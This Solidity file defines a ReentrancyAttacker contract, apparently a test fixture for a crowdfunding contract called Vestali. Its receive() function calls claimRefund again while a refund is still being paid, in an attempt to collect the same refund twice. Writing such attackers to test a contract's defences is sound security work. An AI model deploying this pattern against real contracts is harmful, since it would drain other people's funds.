// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../Vestali.sol";

contract ReentrancyAttacker {
    Vestali public immutable vestali;
    uint256 public targetCampaignId;
    bool public attacking;

    constructor(address payable _vestali) {
        vestali = Vestali(_vestali);
    }

    function contributeTo(uint256 _campaignId) external payable {
        targetCampaignId = _campaignId;
        vestali.contribute{value: msg.value}(_campaignId);
    }

    function attackRefund(uint256 _campaignId) external {
        targetCampaignId = _campaignId;
        attacking = true;
        vestali.claimRefund(_campaignId);
    }

    receive() external payable {
        if (attacking) {
            attacking = false;
            vestali.claimRefund(targetCampaignId);
        }
    }
}
